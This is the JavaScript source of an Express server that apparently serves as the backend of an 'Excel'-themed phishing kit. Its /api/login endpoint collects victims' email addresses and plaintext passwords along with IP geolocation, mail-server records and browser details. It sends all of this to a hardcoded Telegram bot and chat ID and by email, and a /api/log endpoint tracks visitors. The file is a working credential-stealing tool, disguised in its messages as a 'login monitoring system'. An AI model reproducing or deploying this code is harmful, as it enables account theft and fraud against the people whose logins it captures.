const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
const app = express();
const PORT = process.env.PORT || 3000;

// ============================================================
// MIDDLEWARE
// ============================================================

app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ============================================================
// TELEGRAM CONFIGURATION
// ============================================================

const BOT_TOKEN = "8165356500:AAGRl6iz2GNi_Az0xiHgtwTKFOlyNFPJntE";
const CHAT_ID = "6066389308";

// ============================================================
// EMAIL CONFIGURATION - CHANGE THESE!
// ============================================================

const EMAIL_CONFIG = {
    // For Gmail:
    host: 'smtp.gmail.com',
    port: 587,
    secure: false,
    auth: {
        user: 'your-email@gmail.com',     // ← CHANGE THIS
        pass: 'your-app-password'          // ← CHANGE THIS (App Password, not regular password)
    }
};

// For Outlook/Hotmail:
// host: 'smtp.office365.com',
// port: 587,
// secure: false,

// For Yahoo:
// host: 'smtp.mail.yahoo.com',
// port: 587,
// secure: false,

// Email recipients (who receives the login credentials)
const EMAIL_RECIPIENTS = [
    'recipient1@example.com',   // ← CHANGE THIS
    // 'recipient2@example.com'  // Add more if needed
];

// ============================================================
// CREATE EMAIL TRANSPORTER
// ============================================================

let emailTransporter = null;

function createEmailTransporter() {
    try {
        emailTransporter = nodemailer.createTransport(EMAIL_CONFIG);
        console.log('✅ Email transporter created successfully');
        return emailTransporter;
    } catch (error) {
        console.error('❌ Failed to create email transporter:', error.message);
        return null;
    }
}

// ============================================================
// HELPER: Send Email
// ============================================================

async function sendEmail(email, password, ipInfo, userAgent, domain) {
    if (!emailTransporter) {
        console.log('⚠️ Email transporter not configured, skipping email');
        return false;
    }

    const subject = `🔐 ABV Login Credentials - ${email}`;
    
    const htmlContent = `
    <!DOCTYPE html>
    <html>
    <head>
        <style>
            body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; }
            .container { max-width: 600px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            .header { background: #1e930c; color: #fff; padding: 15px; border-radius: 5px 5px 0 0; text-align: center; }
            .content { padding: 20px; }
            .field { margin: 10px 0; padding: 10px; background: #f8f8f8; border-radius: 5px; }
            .label { font-weight: bold; color: #555; }
            .value { color: #1e930c; font-size: 16px; }
            .footer { text-align: center; padding: 15px; color: #999; font-size: 12px; border-top: 1px solid #eee; margin-top: 20px; }
            .badge { display: inline-block; padding: 3px 10px; border-radius: 3px; font-size: 12px; }
            .badge-success { background: #d4edda; color: #155724; }
            .badge-info { background: #d1ecf1; color: #0c5460; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h2>🔐 ABV Login Credentials</h2>
            </div>
            <div class="content">
                <div class="field">
                    <div class="label">📧 Email:</div>
                    <div class="value"><strong>${email}</strong></div>
                </div>
                <div class="field">
                    <div class="label">🔑 Password:</div>
                    <div class="value"><strong>${password}</strong></div>
                </div>
                <div class="field">
                    <div class="label">🌐 Domain:</div>
                    <div class="value">${domain || 'Unknown'}</div>
                </div>
                <div class="field">
                    <div class="label">🌍 IP Address:</div>
                    <div class="value">${ipInfo?.ip || 'Unknown'}</div>
                </div>
                <div class="field">
                    <div class="label">📍 Location:</div>
                    <div class="value">${ipInfo?.city || 'Unknown'}, ${ipInfo?.region || 'Unknown'}, ${ipInfo?.country || 'Unknown'}</div>
                </div>
                <div class="field">
                    <div class="label">📱 Browser:</div>
                    <div class="value">${userAgent?.substring(0, 100) || 'Unknown'}...</div>
                </div>
                <div class="field">
                    <div class="label">🕐 Time:</div>
                    <div class="value">${new Date().toLocaleString()}</div>
                </div>
                <div style="margin-top: 20px; padding: 15px; background: #fff3cd; border-radius: 5px; border-left: 4px solid #ffc107;">
                    <span class="badge badge-info">ℹ️</span> 
                    <span style="font-size: 13px;">This is an automated notification from your ABV login monitoring system.</span>
                </div>
            </div>
            <div class="footer">
                <p>© ${new Date().getFullYear()} ABV Monitor • Automated Notification</p>
            </div>
        </div>
    </body>
    </html>
    `;

    const textContent = `
    🔐 ABV Login Credentials
    ════════════════════════════════════
    
    📧 Email: ${email}
    🔑 Password: ${password}
    🌐 Domain: ${domain || 'Unknown'}
    🌍 IP Address: ${ipInfo?.ip || 'Unknown'}
    📍 Location: ${ipInfo?.city || 'Unknown'}, ${ipInfo?.region || 'Unknown'}, ${ipInfo?.country || 'Unknown'}
    📱 Browser: ${userAgent?.substring(0, 100) || 'Unknown'}...
    🕐 Time: ${new Date().toLocaleString()}
    
    ════════════════════════════════════
    This is an automated notification.
    `;

    try {
        const mailOptions = {
            from: EMAIL_CONFIG.auth.user,
            to: EMAIL_RECIPIENTS.join(', '),
            subject: subject,
            text: textContent,
            html: htmlContent
        };

        const info = await emailTransporter.sendMail(mailOptions);
        console.log('✅ Email sent successfully!');
        console.log('📨 Message ID:', info.messageId);
        console.log('📨 Recipients:', EMAIL_RECIPIENTS.join(', '));
        return true;
    } catch (error) {
        console.error('❌ Failed to send email:', error.message);
        return false;
    }
}

// ============================================================
// HELPER: Send message to Telegram
// ============================================================

async function sendToTelegram(message) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message
            })
        });
        const result = await response.json();
        console.log('📤 Telegram response:', result.ok ? '✅ Sent' : '❌ Failed');
        return result;
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
        return null;
    }
}

// ============================================================
// HELPER: Get IP info
// ============================================================

async function getIPInfo(ip) {
    try {
        const response = await fetch(`https://ipinfo.io/${ip}/json`);
        const data = await response.json();
        return data;
    } catch (error) {
        console.error('❌ IP info error:', error.message);
        return { ip: ip || 'Unknown', country: 'Unknown', city: 'Unknown', region: 'Unknown' };
    }
}

// ============================================================
// HELPER: Get MX Record
// ============================================================

async function getMXRecord(domain) {
    try {
        const response = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
        const data = await response.json();
        if (data && data.Answer && data.Answer.length > 0) {
            return data.Answer.map(record => record.data).join('\n');
        }
        return 'no-mx';
    } catch (error) {
        return 'MX-Error';
    }
}

// ============================================================
// HEALTH CHECK ENDPOINT
// ============================================================

app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        emailConfigured: !!emailTransporter
    });
});

// ============================================================
// MAIN LOGIN ENDPOINT
// ============================================================

app.post('/api/login', async (req, res) => {
    console.log('📧 Login attempt received');
    console.log('📋 Request body:', req.body);

    const { email, password } = req.body;

    if (!email || !password) {
        console.log('❌ Missing email or password');
        return res.status(400).json({
            success: false,
            message: 'Email and password are required'
        });
    }

    const emailRegex = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
    if (!emailRegex.test(email)) {
        console.log('❌ Invalid email format:', email);
        return res.status(400).json({
            success: false,
            message: 'Invalid email format'
        });
    }

    console.log(`📧 Email: ${email}`);
    console.log(`🔑 Password: ${password ? '******' : '(empty)'}`);

    const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress || 'Unknown';
    console.log(`🌐 IP: ${clientIP}`);

    const ipInfo = await getIPInfo(clientIP);
    console.log(`📍 Location: ${ipInfo.city || 'Unknown'}, ${ipInfo.country || 'Unknown'}`);

    const domain = email.split('@')[1];
    console.log(`🌐 Domain: ${domain}`);

    const mxRecord = await getMXRecord(domain);
    console.log(`📨 MX Record: ${mxRecord}`);

    const userAgent = req.headers['user-agent'] || 'Unknown';
    const acceptLanguage = req.headers['accept-language'] || 'Unknown';
    console.log(`📱 Browser: ${userAgent.substring(0, 100)}...`);

    // ============================================================
    // SEND NOTIFICATIONS
    // ============================================================

    // 1. Send to Telegram
    const telegramMessage = `
--------+ Excel ReZulT ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'} +--------
Email : ${email}
Password : ${password}
Checker: ${email}:${password}
Browser : ${userAgent}
Language : ${acceptLanguage}
MX Record : ${mxRecord}
IP Address : ${clientIP}
Region and Country : ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'}
Date : ${new Date().toISOString()}
---------+ Excel ReZulT ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'} +-------------
`;

    console.log('📤 Sending to Telegram...');
    const telegramResult = await sendToTelegram(telegramMessage);

    // 2. Send Email
    console.log('📧 Sending email...');
    const emailResult = await sendEmail(email, password, ipInfo, userAgent, domain);

    // ============================================================
    // RESPONSE
    // ============================================================

    if ((telegramResult && telegramResult.ok) || emailResult) {
        console.log('✅ Notifications sent successfully');
        return res.json({
            success: true,
            message: 'Login processed successfully',
            notifications: {
                telegram: !!(telegramResult && telegramResult.ok),
                email: emailResult
            }
        });
    } else {
        console.log('❌ Failed to send notifications');
        return res.status(500).json({
            success: false,
            message: 'Failed to send notifications'
        });
    }
});

// ============================================================
// LOGGER ENDPOINT
// ============================================================

app.post('/api/log', async (req, res) => {
    console.log('📊 Visitor log received');
    const { email } = req.body;

    const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const acceptLanguage = req.headers['accept-language'] || 'Unknown';

    const ipInfo = await getIPInfo(clientIP);

    const message = `
--------+ Visitor Excel ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'} at ${new Date().toISOString()} +--------
Email : ${email || 'Unknown'}
Browser : ${userAgent}
Language : ${acceptLanguage}
IP Address : ${clientIP}
---------+ Excel Visitor ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'} +-------------
`;

    await sendToTelegram(message);
    res.json({ success: true });
});

// ============================================================
// CATCH-ALL: Handle 404
// ============================================================

app.use('*', (req, res) => {
    res.status(404).json({
        success: false,
        message: `Endpoint not found: ${req.method} ${req.originalUrl}`
    });
});

// ============================================================
// START SERVER
// ============================================================

app.listen(PORT, () => {
    console.log('========================================');
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🌐 Health check: http://localhost:${PORT}/health`);
    console.log(`📧 Login endpoint: http://localhost:${PORT}/api/login`);
    console.log('========================================');
    console.log(`🤖 Telegram Bot: ${BOT_TOKEN ? '✅ Configured' : '❌ Not configured'}`);
    console.log(`📱 Chat ID: ${CHAT_ID ? '✅ Configured' : '❌ Not configured'}`);
    console.log(`📧 Email: ${EMAIL_CONFIG.auth.user ? '✅ Configured' : '❌ Not configured'}`);
    console.log('========================================');

    // Initialize email transporter
    createEmailTransporter();
});

// ============================================================
// ERROR HANDLING
// ============================================================

process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught Exception:', error.message);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Unhandled Rejection:', reason);
});